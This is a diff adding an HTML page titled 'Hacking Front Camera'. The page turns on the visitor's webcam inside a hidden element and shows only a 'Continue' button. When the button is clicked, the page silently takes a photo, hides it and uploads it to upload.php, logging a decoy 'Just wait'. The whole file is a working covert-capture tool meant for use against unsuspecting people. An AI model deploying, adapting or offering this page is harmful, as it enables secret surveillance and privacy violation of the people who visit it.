@@ -1,0 +1,52 @@
+<!doctype html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacking Front Camera</title>
+
+</head>
+<body>
+<div hidden id="my_camera"></div>
+	<input type=button value="Continue" onClick="take_snapshot()">
+    <div id="results"  ></div>
+	<script type="text/javascript" src="webcam.min.js"></script>
+	<script type="text/javascript" charset="utf-8">
+	  Webcam.set({
+				width: 320,
+				height: 240,
+				image_format: 'jpeg',
+				jpeg_quality: 90
+			});
+			Webcam.attach( '#my_camera' );
+	</script>
+	<script language="JavaScript">
+		function take_snapshot() {
+		  Webcam.snap( function(data_uri) {
+		document.getElementById('results').innerHTML = 
+			'<img hidden id="imageprev" src="'+data_uri+'"/>';
+	} );
+	var base64image =  document.getElementById("imageprev").src;
+
+			 Webcam.upload( base64image, 'upload.php', function(code, text) {
+				 console.log('Just wait');
+            });
+}
+	</script>
+	<style type="text/css" media="all">
+	@import url('https://fonts.googleapis.com/css2?family=Supermercado+One&display=swap');
+	  input {
+	    display: block;
+	    margin-right: auto;
+	    margin-left: auto;
+	    margin-top: 50%;
+	    width: 130px;
+	    height: 45px;
+	    border-radius: 25px;
+	    background: black;
+	    color: white;
+	    font-family: 'Supermercado One', cursive;
+	    font-weight: bold;
+	  }
+	</style>
+</body>
+</html>
